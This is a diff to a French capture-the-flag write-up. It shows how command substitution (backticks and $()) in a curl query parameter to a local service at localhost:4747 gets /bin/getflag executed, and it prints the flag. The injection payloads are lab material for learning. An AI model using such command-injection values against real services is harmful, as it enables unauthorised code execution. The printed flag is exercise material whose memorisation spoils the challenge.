@@ -23,7 +23,7 @@ __echo `ls`__ execute ls et non pas affiche ls
 
 __curl localhost:4747/?x=`/bin/getflag`__ ne fonctionne pas non plus
 
-__curl 'localhost:4747/?x=`/bin/getflag`'__ fonctionne ! le \`xxx\` permet de faire comprendre que c'est une entite en soit, et le 'xxx'  permet de dire qu'il y a des char speciaux a prendre en compte
+__curl 'localhost:4747/?x=`/bin/getflag`'__ fonctionne ! le \`xxx\` permet de faire comprendre que c'est une entite en soit, et le 'xxx'  permet de dire qu'il y a des char speciaux a prendre en compte (curl 'localhost:4747/?x=$(/bin/getflag)')
 
 ## Flag : ne2searoevaevoem4ov4ar8ap
 
